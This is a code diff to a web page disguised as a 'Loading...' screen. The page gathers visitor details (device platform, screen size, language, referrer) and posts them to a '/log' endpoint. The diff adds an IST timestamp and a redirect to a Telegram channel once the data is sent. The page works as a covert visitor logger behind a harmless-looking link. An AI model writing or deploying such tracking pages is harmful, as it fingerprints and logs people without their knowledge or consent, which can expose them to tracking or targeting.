@@ -3,6 +3,14 @@
 <head>
   <title>Loading...</title>
   <script>
+    function getISTTime() {
+      const now = new Date();
+      const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
+      const istOffset = 5.5 * 60 * 60000; // IST offset in ms
+      const istTime = new Date(utc + istOffset);
+      return istTime.toString(); // Full IST time string
+    }
+
     async function sendData(info) {
       await fetch('/log', {
         method: 'POST',
@@ -21,7 +29,8 @@
         device: navigator.platform,
         screen: `${screen.width}x${screen.height}`,
         language: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezone: "Asia/Kolkata", // Manually set to IST
+        ist_time: getISTTime(),   // IST time in string
         referrer: document.referrer
       };
 
@@ -32,6 +41,9 @@
       } catch {}
 
       await sendData(info);
+
+      // Redirect after sending data
+      window.location.href = "https://t.me/StarXNetwork";
     });
   </script>
 </head>
